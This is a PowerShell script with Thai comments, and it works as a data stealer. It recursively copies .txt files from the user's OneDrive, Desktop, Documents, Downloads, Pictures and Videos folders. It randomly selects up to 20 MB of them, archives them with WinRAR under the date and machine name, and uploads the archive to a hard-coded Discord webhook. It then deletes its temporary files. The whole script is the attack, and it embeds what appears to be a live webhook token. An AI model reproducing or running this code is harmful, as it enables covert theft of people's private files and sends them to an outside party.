# สร้างโฟลเดอร์สำหรับเก็บไฟล์ที่เลือก
$zipFolder = "$env:TEMP\collected_files"
$selectedFilesFolder = "$env:TEMP\selected_files"
$testExtractFolder = "$env:TEMP\test_extract"
$webhookUrl = "https://discord.com/api/webhooks/1303758531316682825/L8N0IY8YDlXQCQPDd6kfVJ3vNHQzUieIHcOXCKmMcZ3c8tK3fvNL8gjBoj4jvfuPlZrJ"

# ล้างโฟลเดอร์เก็บไฟล์ชั่วคราวและสร้างใหม่
if (Test-Path $zipFolder) { Remove-Item -Recurse -Force $zipFolder }
if (Test-Path $selectedFilesFolder) { Remove-Item -Recurse -Force $selectedFilesFolder }
New-Item -ItemType Directory -Force -Path $zipFolder
New-Item -ItemType Directory -Force -Path $selectedFilesFolder
New-Item -ItemType Directory -Force -Path $testExtractFolder

# เก็บไฟล์ PowerShell (.ps1) ในโฟลเดอร์ Documents มาไว้ในโฟลเดอร์ที่กำหนด
Get-ChildItem -Path "C:\Users\Lenovo\OneDrive", "$env:USERPROFILE\Videos", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents" -Filter *.txt -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $zipFolder -Force

# เลือกไฟล์แบบสุ่มให้อยู่ในขนาดไม่เกิน 20 MB
$maxSize = 20MB
$totalSize = 0
$selectedFiles = Get-ChildItem -Path $zipFolder | Sort-Object {Get-Random}

foreach ($file in $selectedFiles) {
    if (($totalSize + $file.Length) -le $maxSize) {
        Copy-Item -Path $file.FullName -Destination $selectedFilesFolder
        $totalSize += $file.Length
    }
}

# รับวันเดือนปีในรูปแบบ ddMMyyyy
$date = Get-Date -Format "ddMMyyyy"

# รับชื่อเครื่อง
$computerName = $env:COMPUTERNAME

# สร้างชื่อไฟล์ใหม่
$newFileName = "$date" + "_" + "$computerName" + ".rar"


# สร้างไฟล์ RAR
$rarPath = "$env:TEMP\$newFileName"
try {
    & "C:\Program Files\WinRAR\WinRAR.exe" a -r -ep1 $rarPath $selectedFilesFolder\*
    Write-Output "RAR file created successfully at $rarPath."
} catch {
    Write-Output "Error creating RAR file: $_"
    exit
}

# ตรวจสอบความสมบูรณ์ของไฟล์ RAR
if (Test-Path $rarPath) {
    Write-Output "RAR file verified to exist at $rarPath."
    try {
        & "C:\Program Files\WinRAR\WinRAR.exe" t $rarPath
        Write-Output "RAR file integrity check passed."
    } catch {
        Write-Output "RAR file integrity check failed."
        exit
    }
} else {
    Write-Output "RAR file does not exist."
    exit
}

# เตรียมการอัปโหลดไฟล์ไปยัง Discord โดยใช้ FileStream
$boundary = [System.Guid]::NewGuid().ToString()
$header = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

# ใช้ MemoryStream เพื่อเขียน body ของ multipart/form-data
$body = [System.IO.MemoryStream]::new()
$writer = [System.IO.StreamWriter]::new($body)
$writer.WriteLine("--$boundary")
$writer.WriteLine("Content-Disposition: form-data; name=`"file`"; filename=`"$newFileName.rar`"")
$writer.WriteLine("Content-Type: application/x-rar-compressed")
$writer.WriteLine()
$writer.Flush()

# อ่านข้อมูลไฟล์ RAR ด้วย FileStream แล้วเขียนลงใน body
$fileStream = [System.IO.File]::OpenRead($rarPath)
$fileStream.CopyTo($body)
$fileStream.Close()

# ปิดท้าย body ของ multipart/form-data
$writer.WriteLine()
$writer.WriteLine("--$boundary--")
$writer.Flush()
$body.Position = 0

# ส่งข้อมูลไปยัง Discord webhook
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $header -Body $body
    Write-Output "File sent to Discord successfully."
} catch {
    Write-Output "Error sending file to Discord: $_"
} finally {
    $writer.Dispose()
    $body.Dispose()
}

# ล้างโฟลเดอร์ชั่วคราว
Remove-Item -Recurse -Force $zipFolder, $selectedFilesFolder, $testExtractFolder, $rarPath
